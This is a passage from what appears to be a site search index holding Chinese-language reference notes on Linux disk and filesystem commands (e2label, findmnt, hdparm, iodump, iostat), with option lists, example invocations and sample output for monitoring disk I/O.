\u547d\u4ee4\u8be6\u89e3\uff1a\u8bbe\u7f6e\u7b2c\u4e8c\u6269\u5c55\u6587\u4ef6\u7cfb\u7edf\u7684\u5377\u6807 - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com)","title":"e2label\u547d\u4ee4"},{"location":"system/linux/IO/e2label/#e2label","text":"e2label\u5c06\u663e\u793a\u6216\u66f4\u6539\u4f4d\u4e8e\u8bbe\u5907\u4e0a\u7684ext2\u3001ext3\u6216ext4\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u6587\u4ef6\u7cfb\u7edf\u6807\u7b7e\u3002 \u5982\u679c\u53ef\u9009\u53c2\u6570new label\u4e0d\u5b58\u5728\uff0ce2label\u5c06\u53ea\u663e\u793a\u5f53\u524d\u6587\u4ef6\u7cfb\u7edf\u6807\u7b7e\u3002 \u5982\u679c\u5b58\u5728\u53ef\u9009\u53c2\u6570new label\uff0c\u5219e2label\u5c06\u6587\u4ef6\u7cfb\u7edf\u6807\u7b7e\u8bbe\u7f6e\u4e3anew label\u3002Ext2\u6587\u4ef6\u7cfb\u7edf\u6807\u7b7e\u7684\u957f\u5ea6\u6700\u591a\u53ef\u4ee5\u662f16\u4e2a\u5b57\u7b26\uff1b\u5982\u679c\u65b0\u6807\u7b7e\u8d85\u8fc716\u4e2a\u5b57\u7b26\uff0ce2label\u5c06\u622a\u65ad\u5b83\u5e76\u6253\u5370\u4e00\u6761\u8b66\u544a\u6d88\u606f\u3002 \u67e5\u770b\u8bbe\u5907label #e2label /dev/sda1 disk1 \u8bbe\u7f6e\u8bbe\u5907label e2label /dev/sda1 mydisk e2label \u547d\u4ee4\uff0cLinux e2label \u547d\u4ee4\u8be6\u89e3\uff1a\u8bbe\u7f6e\u7b2c\u4e8c\u6269\u5c55\u6587\u4ef6\u7cfb\u7edf\u7684\u5377\u6807 - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com)","title":"e2label\u547d\u4ee4"},{"location":"system/linux/IO/findmnt/","text":"findmnt\u547d\u4ee4 findmnt\u5c06\u5217\u51fa\u6240\u6709\u5b89\u88c5\u7684\u6587\u4ef6\u7cfb\u7edf\u6216\u641c\u7d22\u6587\u4ef6\u7cfb\u7edf\u3002findmnt\u547d\u4ee4\u53ef\u4ee5\u5728/etc/fstab\u3001/etc/fstab.d\u3001/etc/mtab\u6216/proc/self/mountinfo\u4e2d\u8fdb\u884c\u641c\u7d22\u3002\u5982\u679c\u6ca1\u6709\u7ed9\u51fa\u8bbe\u5907\u6216\u88c5\u5165\u70b9\uff0c\u5219\u4f1a\u663e\u793a\u6240\u6709\u6587\u4ef6\u7cfb\u7edf\u3002 findmnt(8): find filesystem - Linux man page (die.net) \u7cfb\u7edf\u8fd0\u7ef4|findmnt \u547d\u4ee4\u7684\u516b\u4e2a\u5e94\u7528\u5b9e\u4f8b (linux.cn) \u5e38\u7528 -s\uff0c --fstab \u5728 / etc/fstab \u548c /etc/fstab.d \u4e2d\u641c\u7d22\u3002\u8f93\u51fa\u91c7\u7528\u5217\u8868\u683c\u5f0f\uff08\u8bf7\u53c2\u9605 --list\uff09\u3002 -m\uff0c --mtab \u5728 / etc/mtab \u4e2d\u641c\u7d22\u3002\u8f93\u51fa\u91c7\u7528\u5217\u8868\u683c\u5f0f\uff08\u8bf7\u53c2\u9605 --list\uff09\u3002 -k\uff0c --kernel \u5728 / proc/self/mountinfo \u4e2d\u641c\u7d22\u3002\u8f93\u51fa\u91c7\u7528\u6811\u72b6\u683c\u5f0f\u3002\u8fd9\u662f\u9ed8\u8ba4\u503c\u3002","title":"findmnt\u547d\u4ee4"},{"location":"system/linux/IO/findmnt/#findmnt","text":"findmnt\u5c06\u5217\u51fa\u6240\u6709\u5b89\u88c5\u7684\u6587\u4ef6\u7cfb\u7edf\u6216\u641c\u7d22\u6587\u4ef6\u7cfb\u7edf\u3002findmnt\u547d\u4ee4\u53ef\u4ee5\u5728/etc/fstab\u3001/etc/fstab.d\u3001/etc/mtab\u6216/proc/self/mountinfo\u4e2d\u8fdb\u884c\u641c\u7d22\u3002\u5982\u679c\u6ca1\u6709\u7ed9\u51fa\u8bbe\u5907\u6216\u88c5\u5165\u70b9\uff0c\u5219\u4f1a\u663e\u793a\u6240\u6709\u6587\u4ef6\u7cfb\u7edf\u3002 findmnt(8): find filesystem - Linux man page (die.net) \u7cfb\u7edf\u8fd0\u7ef4|findmnt \u547d\u4ee4\u7684\u516b\u4e2a\u5e94\u7528\u5b9e\u4f8b (linux.cn) \u5e38\u7528 -s\uff0c --fstab \u5728 / etc/fstab \u548c /etc/fstab.d \u4e2d\u641c\u7d22\u3002\u8f93\u51fa\u91c7\u7528\u5217\u8868\u683c\u5f0f\uff08\u8bf7\u53c2\u9605 --list\uff09\u3002 -m\uff0c --mtab \u5728 / etc/mtab \u4e2d\u641c\u7d22\u3002\u8f93\u51fa\u91c7\u7528\u5217\u8868\u683c\u5f0f\uff08\u8bf7\u53c2\u9605 --list\uff09\u3002 -k\uff0c --kernel \u5728 / proc/self/mountinfo \u4e2d\u641c\u7d22\u3002\u8f93\u51fa\u91c7\u7528\u6811\u72b6\u683c\u5f0f\u3002\u8fd9\u662f\u9ed8\u8ba4\u503c\u3002","title":"findmnt\u547d\u4ee4"},{"location":"system/linux/IO/hdparm%E5%91%BD%E4%BB%A4/","text":"hdparm\u547d\u4ee4 Linux hdparm\u547d\u4ee4\u7528\u4e8e\u663e\u793a\u4e0e\u8bbe\u5b9a\u786c\u76d8\u7684\u53c2\u6570\u3002 hdparm\u53ef\u68c0\u6d4b\uff0c\u663e\u793a\u4e0e\u8bbe\u5b9aIDE\u6216SCSI\u786c\u76d8\u7684\u53c2\u6570\u3002 \u8bed\u6cd5 hdparm [-CfghiIqtTvyYZ][-a <\u5feb\u53d6\u5206\u533a>][-A <0\u62161>][-c <I/O\u6a21\u5f0f>][-d <0\u62161>][-k <0\u62161>][-K <0\u62161>][-m <\u5206\u533a\u6570>][-n <0\u62161>][-p <PIO\u6a21\u5f0f>][-P <\u5206\u533a\u6570>][-r <0\u62161>][-S <\u65f6\u95f4>][-u <0\u62161>][-W <0\u62161>][-X <\u4f20\u8f93\u6a21\u5f0f>][\u8bbe\u5907] \u53c2\u6570\u8bf4\u660e \uff1a -a<\u5feb\u53d6\u5206\u533a> \u8bbe\u5b9a\u8bfb\u53d6\u6587\u4ef6\u65f6\uff0c\u9884\u5148\u5b58\u5165\u5757\u533a\u7684\u5206\u533a\u6570\uff0c\u82e5\u4e0d\u52a0\u4e0a<\u5feb\u53d6\u5206\u533a>\u9009\u9879\uff0c\u5219\u663e\u793a\u76ee\u524d\u7684\u8bbe\u5b9a\u3002 -A<0\u62161> \u542f\u52a8\u6216\u5173\u95ed\u8bfb\u53d6\u6587\u4ef6\u65f6\u7684\u5feb\u53d6\u529f\u80fd\u3002 -c \u8bbe\u5b9aIDE32\u4f4dI/O\u6a21\u5f0f\u3002 -C \u68c0\u6d4bIDE\u786c\u76d8\u7684\u7535\u6e90\u7ba1\u7406\u6a21\u5f0f\u3002 -d<0\u62161> \u8bbe\u5b9a\u78c1\u76d8\u7684DMA\u6a21\u5f0f\u3002 -f \u5c06\u5185\u5b58\u7f13\u51b2\u533a\u7684\u6570\u636e\u5199\u5165\u786c\u76d8\uff0c\u5e76\u6e05\u695a\u7f13\u51b2\u533a\u3002 -g \u663e\u793a\u786c\u76d8\u7684\u78c1\u8f68\uff0c\u78c1\u5934\uff0c\u78c1\u533a\u7b49\u53c2\u6570\u3002 -h \u663e\u793a\u5e2e\u52a9\u3002 -i \u663e\u793a\u786c\u76d8\u7684\u786c\u4ef6\u89c4\u683c\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u662f\u5728\u5f00\u673a\u65f6\u7531\u786c\u76d8\u672c\u8eab\u6240\u63d0\u4f9b\u3002 -I \u76f4\u63a5\u8bfb\u53d6\u786c\u76d8\u6240\u63d0\u4f9b\u7684\u786c\u4ef6\u89c4\u683c\u4fe1\u606f\u3002 -k<0\u62161> \u91cd\u8bbe\u786c\u76d8\u65f6\uff0c\u4fdd\u7559-dmu\u53c2\u6570\u7684\u8bbe\u5b9a\u3002 -K<0\u62161> \u91cd\u8bbe\u786c\u76d8\u65f6\uff0c\u4fdd\u7559-APSWXZ\u53c2\u6570\u7684\u8bbe\u5b9a\u3002 -m<\u78c1\u533a\u6570> \u8bbe\u5b9a\u786c\u76d8\u591a\u91cd\u5206\u533a\u5b58\u53d6\u7684\u5206\u533a\u6570\u3002 -n<0\u62161> \u5ffd\u7565\u786c\u76d8\u5199\u5165\u65f6\u6240\u53d1\u751f\u7684\u9519\u8bef\u3002 -p \u8bbe\u5b9a\u786c\u76d8\u7684PIO\u6a21\u5f0f\u3002 -P<\u78c1\u533a\u6570> \u8bbe\u5b9a\u786c\u76d8\u5185\u90e8\u5feb\u53d6\u7684\u5206\u533a\u6570\u3002 -q \u5728\u6267\u884c\u540e\u7eed\u7684\u53c2\u6570\u65f6\uff0c\u4e0d\u5728\u5c4f\u5e55\u4e0a\u663e\u793a\u4efb\u4f55\u4fe1\u606f\u3002 -r<0\u62161> \u8bbe\u5b9a\u786c\u76d8\u7684\u8bfb\u5199\u6a21\u5f0f\u3002 -S<\u65f6\u95f4> \u8bbe\u5b9a\u786c\u76d8\u8fdb\u5165\u7701\u7535\u6a21\u5f0f\u524d\u7684\u7b49\u5f85\u65f6\u95f4\u3002 -t \u8bc4\u4f30\u786c\u76d8\u7684\u8bfb\u53d6\u6548\u7387\u3002 -T \u8bc4\u4f30\u786c\u76d8\u5feb\u53d6\u7684\u8bfb\u53d6\u6548\u7387\u3002 -u<0\u62161> \u5728\u786c\u76d8\u5b58\u53d6\u65f6\uff0c\u5141\u8bb8\u5176\u4ed6\u4e2d\u65ad\u8981\u6c42\u540c\u65f6\u6267\u884c\u3002 -v \u663e\u793a\u786c\u76d8\u7684\u76f8\u5173\u8bbe\u5b9a\u3002 -W<0\u62161> \u5173\u95ed/\u5f00\u542f\u78c1\u76d8\u7684\u5199\u5165\u7f13\u5b58\uff0c\u6bcf\u4e2a\u76d8\u90fd\u6709\u8bfb\u53d6\u7f13\u5b58\u548c\u5199\u5165\u7f13\u5b58\uff0c\u6709\u65f6\u6211\u4eec\u5173\u95ed\u78c1\u76d8\u5199\u5165\u7f13\u5b58\u7684\u6548\u7387\u9ad8\u4e8e\u5f00\u542f\u78c1\u76d8\u5199\u5165\u7f13\u5b58\u7684\u6548\u7387\uff0c\u90a3\u5f53\u7136\u9009\u62e9\u524d\u8005\u4e86\u3002 -X<\u4f20\u8f93\u6a21\u5f0f> \u8bbe\u5b9a\u786c\u76d8\u7684\u4f20\u8f93\u6a21\u5f0f\u3002 -y \u4f7fIDE\u786c\u76d8\u8fdb\u5165\u7701\u7535\u6a21\u5f0f\u3002 -Y \u4f7fIDE\u786c\u76d8\u8fdb\u5165\u7761\u7720\u6a21\u5f0f\u3002 -Z \u5173\u95ed\u67d0\u4e9bSeagate\u786c\u76d8\u7684\u81ea\u52a8\u7701\u7535\u529f\u80fd\u3002 \u5b9e\u4f8b \u663e\u793a\u786c\u76d8\u7684\u76f8\u5173\u8bbe\u7f6e\uff1a # hdparm /dev/sda /dev/sda: IO_support = 0 (default 16-bit) readonly = 0 (off) readahead = 256 (on) geometry = 19929\uff3b\u67f1\u9762\u6570\uff3d/255\uff3b\u78c1\u5934\u6570\uff3d/63\uff3b\u6247\u533a\u6570\uff3d, sectors = 320173056\uff3b\u603b\u6247\u533a\u6570\uff3d, start = 0\uff3b\u8d77\u59cb\u6247\u533a\u6570\uff3d \u663e\u793a\u786c\u76d8\u7684\u67f1\u9762\u3001\u78c1\u5934\u3001\u6247\u533a\u6570 # hdparm -g /dev/sda /dev/sda: geometry = 19929\uff3b\u67f1\u9762\u6570\uff3d/255\uff3b\u78c1\u5934\u6570\uff3d/63\uff3b\u6247\u533a\u6570\uff3d, sectors = 320173056\uff3b\u603b\u6247\u533a\u6570\uff3d, start = 0\uff3b\u8d77\u59cb\u6247\u533a\u6570\uff3d \u8bc4\u4f30\u786c\u76d8\u7684\u8bfb\u53d6\u6548\u7387 hdparm -t /dev/sda /dev/sda: Timing buffered disk reads: 166 MB in 3.03 seconds = 54.85 MB/sec [root@linuxso.com ~]# hdparm -t /dev/sda /dev/sda: Timing buffered disk reads: 160 MB in 3.01 seconds = 53.11 MB/sec [root@linuxso.com ~]# hdparm -t /dev/sda /dev/sda: Timing buffered disk reads: 166 MB in 3.00 seconds = 55.31 MB/sec","title":"hdparm\u547d\u4ee4"},{"location":"system/linux/IO/hdparm%E5%91%BD%E4%BB%A4/#hdparm","text":"Linux hdparm\u547d\u4ee4\u7528\u4e8e\u663e\u793a\u4e0e\u8bbe\u5b9a\u786c\u76d8\u7684\u53c2\u6570\u3002 hdparm\u53ef\u68c0\u6d4b\uff0c\u663e\u793a\u4e0e\u8bbe\u5b9aIDE\u6216SCSI\u786c\u76d8\u7684\u53c2\u6570\u3002","title":"hdparm\u547d\u4ee4"},{"location":"system/linux/IO/hdparm%E5%91%BD%E4%BB%A4/#_1","text":"hdparm [-CfghiIqtTvyYZ][-a <\u5feb\u53d6\u5206\u533a>][-A <0\u62161>][-c <I/O\u6a21\u5f0f>][-d <0\u62161>][-k <0\u62161>][-K <0\u62161>][-m <\u5206\u533a\u6570>][-n <0\u62161>][-p <PIO\u6a21\u5f0f>][-P <\u5206\u533a\u6570>][-r <0\u62161>][-S <\u65f6\u95f4>][-u <0\u62161>][-W <0\u62161>][-X <\u4f20\u8f93\u6a21\u5f0f>][\u8bbe\u5907] \u53c2\u6570\u8bf4\u660e \uff1a -a<\u5feb\u53d6\u5206\u533a> \u8bbe\u5b9a\u8bfb\u53d6\u6587\u4ef6\u65f6\uff0c\u9884\u5148\u5b58\u5165\u5757\u533a\u7684\u5206\u533a\u6570\uff0c\u82e5\u4e0d\u52a0\u4e0a<\u5feb\u53d6\u5206\u533a>\u9009\u9879\uff0c\u5219\u663e\u793a\u76ee\u524d\u7684\u8bbe\u5b9a\u3002 -A<0\u62161> \u542f\u52a8\u6216\u5173\u95ed\u8bfb\u53d6\u6587\u4ef6\u65f6\u7684\u5feb\u53d6\u529f\u80fd\u3002 -c \u8bbe\u5b9aIDE32\u4f4dI/O\u6a21\u5f0f\u3002 -C \u68c0\u6d4bIDE\u786c\u76d8\u7684\u7535\u6e90\u7ba1\u7406\u6a21\u5f0f\u3002 -d<0\u62161> \u8bbe\u5b9a\u78c1\u76d8\u7684DMA\u6a21\u5f0f\u3002 -f \u5c06\u5185\u5b58\u7f13\u51b2\u533a\u7684\u6570\u636e\u5199\u5165\u786c\u76d8\uff0c\u5e76\u6e05\u695a\u7f13\u51b2\u533a\u3002 -g \u663e\u793a\u786c\u76d8\u7684\u78c1\u8f68\uff0c\u78c1\u5934\uff0c\u78c1\u533a\u7b49\u53c2\u6570\u3002 -h \u663e\u793a\u5e2e\u52a9\u3002 -i \u663e\u793a\u786c\u76d8\u7684\u786c\u4ef6\u89c4\u683c\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u662f\u5728\u5f00\u673a\u65f6\u7531\u786c\u76d8\u672c\u8eab\u6240\u63d0\u4f9b\u3002 -I \u76f4\u63a5\u8bfb\u53d6\u786c\u76d8\u6240\u63d0\u4f9b\u7684\u786c\u4ef6\u89c4\u683c\u4fe1\u606f\u3002 -k<0\u62161> \u91cd\u8bbe\u786c\u76d8\u65f6\uff0c\u4fdd\u7559-dmu\u53c2\u6570\u7684\u8bbe\u5b9a\u3002 -K<0\u62161> \u91cd\u8bbe\u786c\u76d8\u65f6\uff0c\u4fdd\u7559-APSWXZ\u53c2\u6570\u7684\u8bbe\u5b9a\u3002 -m<\u78c1\u533a\u6570> \u8bbe\u5b9a\u786c\u76d8\u591a\u91cd\u5206\u533a\u5b58\u53d6\u7684\u5206\u533a\u6570\u3002 -n<0\u62161> \u5ffd\u7565\u786c\u76d8\u5199\u5165\u65f6\u6240\u53d1\u751f\u7684\u9519\u8bef\u3002 -p \u8bbe\u5b9a\u786c\u76d8\u7684PIO\u6a21\u5f0f\u3002 -P<\u78c1\u533a\u6570> \u8bbe\u5b9a\u786c\u76d8\u5185\u90e8\u5feb\u53d6\u7684\u5206\u533a\u6570\u3002 -q \u5728\u6267\u884c\u540e\u7eed\u7684\u53c2\u6570\u65f6\uff0c\u4e0d\u5728\u5c4f\u5e55\u4e0a\u663e\u793a\u4efb\u4f55\u4fe1\u606f\u3002 -r<0\u62161> \u8bbe\u5b9a\u786c\u76d8\u7684\u8bfb\u5199\u6a21\u5f0f\u3002 -S<\u65f6\u95f4> \u8bbe\u5b9a\u786c\u76d8\u8fdb\u5165\u7701\u7535\u6a21\u5f0f\u524d\u7684\u7b49\u5f85\u65f6\u95f4\u3002 -t \u8bc4\u4f30\u786c\u76d8\u7684\u8bfb\u53d6\u6548\u7387\u3002 -T \u8bc4\u4f30\u786c\u76d8\u5feb\u53d6\u7684\u8bfb\u53d6\u6548\u7387\u3002 -u<0\u62161> \u5728\u786c\u76d8\u5b58\u53d6\u65f6\uff0c\u5141\u8bb8\u5176\u4ed6\u4e2d\u65ad\u8981\u6c42\u540c\u65f6\u6267\u884c\u3002 -v \u663e\u793a\u786c\u76d8\u7684\u76f8\u5173\u8bbe\u5b9a\u3002 -W<0\u62161> \u5173\u95ed/\u5f00\u542f\u78c1\u76d8\u7684\u5199\u5165\u7f13\u5b58\uff0c\u6bcf\u4e2a\u76d8\u90fd\u6709\u8bfb\u53d6\u7f13\u5b58\u548c\u5199\u5165\u7f13\u5b58\uff0c\u6709\u65f6\u6211\u4eec\u5173\u95ed\u78c1\u76d8\u5199\u5165\u7f13\u5b58\u7684\u6548\u7387\u9ad8\u4e8e\u5f00\u542f\u78c1\u76d8\u5199\u5165\u7f13\u5b58\u7684\u6548\u7387\uff0c\u90a3\u5f53\u7136\u9009\u62e9\u524d\u8005\u4e86\u3002 -X<\u4f20\u8f93\u6a21\u5f0f> \u8bbe\u5b9a\u786c\u76d8\u7684\u4f20\u8f93\u6a21\u5f0f\u3002 -y \u4f7fIDE\u786c\u76d8\u8fdb\u5165\u7701\u7535\u6a21\u5f0f\u3002 -Y \u4f7fIDE\u786c\u76d8\u8fdb\u5165\u7761\u7720\u6a21\u5f0f\u3002 -Z \u5173\u95ed\u67d0\u4e9bSeagate\u786c\u76d8\u7684\u81ea\u52a8\u7701\u7535\u529f\u80fd\u3002","title":"\u8bed\u6cd5"},{"location":"system/linux/IO/hdparm%E5%91%BD%E4%BB%A4/#_2","text":"\u663e\u793a\u786c\u76d8\u7684\u76f8\u5173\u8bbe\u7f6e\uff1a # hdparm /dev/sda /dev/sda: IO_support = 0 (default 16-bit) readonly = 0 (off) readahead = 256 (on) geometry = 19929\uff3b\u67f1\u9762\u6570\uff3d/255\uff3b\u78c1\u5934\u6570\uff3d/63\uff3b\u6247\u533a\u6570\uff3d, sectors = 320173056\uff3b\u603b\u6247\u533a\u6570\uff3d, start = 0\uff3b\u8d77\u59cb\u6247\u533a\u6570\uff3d \u663e\u793a\u786c\u76d8\u7684\u67f1\u9762\u3001\u78c1\u5934\u3001\u6247\u533a\u6570 # hdparm -g /dev/sda /dev/sda: geometry = 19929\uff3b\u67f1\u9762\u6570\uff3d/255\uff3b\u78c1\u5934\u6570\uff3d/63\uff3b\u6247\u533a\u6570\uff3d, sectors = 320173056\uff3b\u603b\u6247\u533a\u6570\uff3d, start = 0\uff3b\u8d77\u59cb\u6247\u533a\u6570\uff3d \u8bc4\u4f30\u786c\u76d8\u7684\u8bfb\u53d6\u6548\u7387 hdparm -t /dev/sda /dev/sda: Timing buffered disk reads: 166 MB in 3.03 seconds = 54.85 MB/sec [root@linuxso.com ~]# hdparm -t /dev/sda /dev/sda: Timing buffered disk reads: 160 MB in 3.01 seconds = 53.11 MB/sec [root@linuxso.com ~]# hdparm -t /dev/sda /dev/sda: Timing buffered disk reads: 166 MB in 3.00 seconds = 55.31 MB/sec","title":"\u5b9e\u4f8b"},{"location":"system/linux/IO/iodump/","text":"iodump\u547d\u4ee4 \u8be6\u89c1\uff1a README.md \u00b7 90cc/iodump - Gitee.com iodump -p vda1 >/tmp/iodump.txt \u7ea61\u5206\u949f\u540ectrl+c\u53d6\u6d88\uff08\u4e5f\u53ef\u4ee5kill $pid\uff0c\u4f46\u4e0d\u53ef\u4ee5kill -9\uff09 \u6ce8\u610f\u5173\u6ce8/tmp/iodump.txt\u5927\u5c0f\uff0c\u4e0d\u8981\u6253\u6ee1\u78c1\u76d8 [root@VM-0-16-centos x86_64]# cat /tmp/iodump.txt datetime comm pid iosize sector rw rwsec launcher fullpath 2023-04-04T11:24:22.554278 iodump 2710 4096 18610168 W S fsync /tmp/iodump.txt 2023-04-04T11:24:22.557115 jbd2/vda1-8 291 4096 7922192 W FS ret_from_fork_nospec_end - 2023-04-04T11:24:22.555355 jbd2/vda1-8 291 4096 7922056 W S ret_from_fork_nospec_end - 2023-04-04T11:24:22.579134 YDService 15850 81920 22577408 W S fsync /usr/local/qcloud/YunJing/cache/fcache.db-journal 2023-04-04T11:24:22.584122 jbd2/vda1-8 291 4096 7922264 W FS ret_from_fork_nospec_end - 2023-04-04T11:24:22.587624 jbd2/vda1-8 291 4096 7922272 W S ret_from_fork_nospec_end - 2023-04-04T11:24:22.581911 jbd2/vda1-8 291 4096 7922200 W S ret_from_fork_nospec_end - 2023-04-04T11:24:22.585441 YDService 15850 4096 22577408 W S fsync /usr/local/qcloud/YunJing/cache/fcache.db-journal 2023-04-04T11:24:22.589702 jbd2/vda1-8 291 4096 7922288 W FS ret_from_fork_nospec_end - 2023-04-04T11:24:22.596431 jbd2/vda1-8 291 4096 7922296 W S ret_from_fork_nospec_end - 2023-04-04T11:24:22.597513 jbd2/vda1-8 291 4096 7922320 W FS ret_from_fork_nospec_end - 2023-04-04T11:24:22.591187 YDService 15850 4096 800968 W S fsync /usr/local/qcloud/YunJing/cache/fcache.db 2023-04-04T11:24:22.591200 YDService 15850 8192 3746184 W S fsync /usr/local/qcloud/YunJing/cache/fcache.db 2023-04-04T11:24:22.591209 YDService 15850 4096 802560 W S fsync /usr/local/qcloud/YunJing/cache/fcache.db \u8bfb\u5199\u6700\u591a\u7684\u6587\u4ef6\u6392\u5e8f echo \"\u8bfb\u5199\u6b21\u6570 \u6587\u4ef6\u540d\" ; cat /tmp/iodump.txt | awk '{print $9}' | sort -rn | uniq -c | sort -rn | head -n 10 \u8bfb\u5199\u6700\u591a\u7684\u8fdb\u7a0b\u53f7\u6392\u5e8f echo \"\u8bfb\u5199\u6b21\u6570 \u8fdb\u7a0b\u53f7 \u8fdb\u7a0b\u540d\" ; cat /tmp/iodump.txt | awk '{print $3\" \"$2}' | sort -rn | uniq -c | sort -rn | head -n 10 \u5199\u5165\u6700\u591a\u7684\u6587\u4ef6\u6392\u5e8f echo \"\u5199\u5165\u6b21\u6570 \u6587\u4ef6\u540d\" ; cat /tmp/iodump.txt | grep 'W' | awk '{print $9}' | sort -rn | uniq -c | sort -rn | head -n 10 \u5199\u5165\u6700\u591a\u7684\u8fdb\u7a0b\u53f7\u6392\u5e8f echo \"\u5199\u5165\u6b21\u6570 \u8fdb\u7a0b\u53f7 \u8fdb\u7a0b\u540d\" ; cat /tmp/iodump.txt | grep 'W' | awk '{print $3\" \"$2}' | sort -rn | uniq -c | sort -rn | head -n 10 \u901a\u8fc7block_dump\u6293\u53d6\u4f7f\u7528\u78c1\u76d8io\u8f83\u9ad8\u7684\u8fdb\u7a0b /proc/sys/vm/block_dump \u7f3a\u7701\u8bbe\u7f6e\uff1a0\uff0c\u7981\u7528Block Debug\u6a21\u5f0f \u8be5\u6587\u4ef6\u8868\u793a\u662f\u5426\u6253\u5f00Block Debug\u6a21\u5f0f\uff0c\u7528\u4e8e\u8bb0\u5f55\u6240\u6709\u7684\u8bfb\u5199\u53caDirty Block\u5199\u56de\u52a8\u4f5c\u3002 \u8ffd\u8e2a60\u79d2\u5185\uff0c\u6309\u7167\u8bfb\u5199\u6700\u591a\u7684\u6b21\u6570\u5bf9\u8fdb\u7a0b\u8fdb\u884c\u6392\u5e8f echo 1 > /proc/sys/vm/block_dump ; sleep 60 ; dmesg | awk '/vda/ {print $2}' |sort |uniq -c | sort -rn ; echo 0 > /proc/sys/vm/block_dump \u8ffd\u8e2a60\u79d2\u5185\uff0c\u6309\u7167\u6bcf\u79cd\u8bfb\u5199\u7c7b\u578b\u6700\u591a\u7684\u6b21\u6570\u5bf9\u8fdb\u7a0b\u8fdb\u884c\u6392\u5e8f echo 1 > /proc/sys/vm/block_dump ; sleep 60 ; dmesg |awk ' /vda/ {print $2 $3}' |sort |uniq -c | sort -rn ; echo 0 > /proc/sys/vm/block_dump","title":"iodump\u547d\u4ee4"},{"location":"system/linux/IO/iostat/","text":"iostat\u547d\u4ee4 \u5e38\u89c1\u6807\u9898\u663e\u793a $ iostat -xt 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/29/2022 _x86_64_ (4 CPU) 05/29/2022 09:23:14 PM avg-cpu: %user %nice %system %iowait %steal %idle 0.09 0.00 0.12 0.01 0.00 99.79 Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util vda 0.00 0.22 0.02 0.65 0.95 4.77 17.04 0.00 2.24 3.84 2.19 0.57 0.04 vdb 0.00 0.00 0.00 0.00 0.00 0.00 48.89 0.00 0.49 0.49 0.00 0.33 0.00 scd0 0.00 0.00 0.00 0.00 0.00 0.00 7.23 0.00 0.18 0.18 0.00 0.18 0.00 \"iostat\u547d\u4ee4\u8be6\u60c5\" \"%user\uff1aCPU\u5904\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%nice\uff1aCPU\u5904\u5728\u5e26NICE\u503c\u7684\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%system\uff1aCPU\u5904\u5728\u7cfb\u7edf\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\u6b63\u5e38\u5c0f\u4e8e15%\" \"%iowait\uff1aCPU\u7b49\u5f85\u8f93\u5165\u8f93\u51fa\u5b8c\u6210\u65f6\u95f4\u7684\u767e\u5206\u6bd4\u3002\" \"%steal\uff1a\u7ba1\u7406\u7a0b\u5e8f\u7ef4\u62a4\u53e6\u4e00\u4e2a\u865a\u62df\u5904\u7406\u5668\u65f6\uff0c\u865a\u62dfCPU\u7684\u65e0\u610f\u8bc6\u7b49\u5f85\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%idle\uff1aCPU\u7a7a\u95f2\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"rrqm/s\uff1a\u6bcf\u79d2\u8fd9\u4e2a\u8bbe\u5907\u76f8\u5173\u7684\u8bfb\u53d6\u8bf7\u6c42\u6709\u591a\u5c11\u88abMerge\u4e86\uff08\u5f53\u7cfb\u7edf\u8c03\u7528\u9700\u8981\u8bfb\u53d6\u6570\u636e\u7684\u65f6\u5019\uff0cVFS\u5c06\u8bf7\u6c42\u53d1\u5230\u5404\u4e2aFS\uff0c\u5982\u679cFS\u53d1\u73b0\u4e0d\u540c\u7684\u8bfb\u53d6\u8bf7\u6c42\u8bfb\u53d6\u7684\u662f\u76f8\u540cBlock\u7684\u6570\u636e\uff0cFS\u4f1a\u5c06\u8fd9\u4e2a\u8bf7\u6c42\u5408\u5e76Merge\uff09\" \"wrqm/s\uff1a\u6bcf\u79d2\u8fd9\u4e2a\u8bbe\u5907\u76f8\u5173\u7684\u5199\u5165\u8bf7\u6c42\u6709\u591a\u5c11\u88abMerge\u4e86\" \"rsec/s\uff1a\u6bcf\u79d2\u8bfb\u53d6\u7684\u6247\u533a\u6570\" \"wsec/\uff1a\u6bcf\u79d2\u5199\u5165\u7684\u6247\u533a\u6570\" \"r/s\uff1a\u6bcf\u79d2\u5b8c\u6210\u7684\u8bfb\u6b21\u6570\" \"w/s\uff1a\u6bcf\u79d2\u5b8c\u6210\u7684\u5199\u6b21\u6570\" \"avgrq-sz\uff1a\u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u6570\u636e\u5927\u5c0f (\u6247\u533a)\u3002delta(rsect+wsect)/delta(rio+wio)\" \"avgqu-sz\uff1a\u5e73\u5747I/O\u961f\u5217\u957f\u5ea6\u3002\u5373 delta(aveq)/s/1000 (\u56e0\u4e3aaveq\u7684\u5355\u4f4d\u4e3a\u6beb\u79d2)\u3002\" \u961f\u5217\u957f\u5ea6\uff08avgqu-sz\uff09\u4e5f\u53ef\u4f5c\u4e3a\u8861\u91cf\u7cfb\u7edf I/O \u8d1f\u8377\u7684\u6307\u6807\uff0c\u4f46\u7531\u4e8e avgqu-sz \u662f\u6309\u7167\u5355\u4f4d\u65f6\u95f4\u7684\u5e73\u5747\u503c\uff0c\u6240\u4ee5\u4e0d\u80fd\u53cd\u6620\u77ac\u95f4\u7684 I/O \u6d2a\u6c34\u3002 \"await\uff1a \u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u7b49\u5f85\u65f6\u95f4 (\u6beb\u79d2)\u3002\u5373 delta(ruse+wuse)/delta(rio+wio)\" \u5e73\u65f6\u5c31\u770bawait\u503c\u5927\u5c0f\uff0c\u51e0\u5343\u6216\u8005\u51e0\u4e07\u78c1\u76d8\u5c31\u662f\u6709\u95ee\u9898 